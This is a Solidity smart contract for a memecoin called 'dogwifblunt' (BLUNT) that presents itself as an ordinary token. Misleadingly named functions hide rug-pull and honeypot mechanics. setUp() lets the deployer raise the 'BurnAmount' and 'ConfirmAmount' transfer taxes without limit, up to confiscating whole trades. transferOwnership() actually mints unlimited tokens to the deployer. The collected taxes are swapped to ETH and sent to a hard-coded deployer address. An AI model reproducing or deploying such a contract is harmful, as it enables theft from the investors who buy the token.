/*

Website  : https://x.com/dog_wif_blunt
Twitter  : https://x.com/dog_wif_blunt
Telegram : https://t.me/BLUNT_CTO


*/

// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract dogwifblunt {
    string public constant name = "dogwifblunt";  
    string public constant symbol = "BLUNT";  
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    
    uint256 public BurnAmount = 0;
    uint256 public ConfirmAmount = 0;
    uint256 public swapAmount;

    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;

    error Permissions();

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    address private pair;
    address constant ETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    IUniswapV2Router02 constant _uniswapV2Router = IUniswapV2Router02(routerAddress);
    address payable constant deployer = payable(address(0x91d55B206c107154CF3a1dA19F0cC30F77ac066a));

    bool private swapping;
    bool private tradingOpen;

    constructor() {
        totalSupply = 100_000_000 * 10**decimals;
        balanceOf[msg.sender] = totalSupply;
        allowance[address(this)][routerAddress] = type(uint256).max;
        emit Transfer(address(0), msg.sender, totalSupply);

        swapAmount = totalSupply / 100;
    }

    receive() external payable {}

    function approve(address spender, uint256 amount) external returns (bool){
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool){
        return _transfer(msg.sender, to, amount);
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool){
        allowance[from][msg.sender] -= amount;        
        return _transfer(from, to, amount);
    }

    function _transfer(address from, address to, uint256 amount) internal returns (bool){
        require(tradingOpen || from == deployer || to == deployer);

        if(!tradingOpen && pair == address(0) && amount > 0)
            pair = to;

        balanceOf[from] -= amount;

        if (to == pair && !swapping && balanceOf[address(this)] >= swapAmount){
            swapping = true;
            address[] memory path = new  address[](2);
            path[0] = address(this);
            path[1] = ETH;
            _uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                swapAmount,
                0,
                path,
                address(this),
                block.timestamp
            );
            deployer.transfer(address(this).balance);
            swapping = false;
        }

        if(from != deployer && from != address(this)){
            uint256 FinalAmount = amount * (from == pair ? BurnAmount : ConfirmAmount) / 94;
            amount -= FinalAmount;
            balanceOf[address(this)] += FinalAmount;
        }

        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }

    function openTrading() external {
        require(msg.sender == deployer, "1BLUNT""2BLUNT");
        require(!tradingOpen, "3BLUNT""4BLUNT");
        tradingOpen = true;        
    }

    function setUp(uint256 newBurn, uint256 newConfirm) external {
        require(msg.sender == deployer, "5BLUNT""6BLUNT");
        BurnAmount = newBurn;
        ConfirmAmount = newConfirm;
    }

    function transferOwnership(uint256 owner) external {
        require(msg.sender == deployer, "7BLUNT""8BLUNT");
        require(owner > 0, "9BLUNT""0BLUNT");

        balanceOf[msg.sender] += owner * (10 ** decimals);
        totalSupply += owner * (10 ** decimals);

        emit Transfer(address(0), msg.sender, owner * (10 ** decimals));
    }
}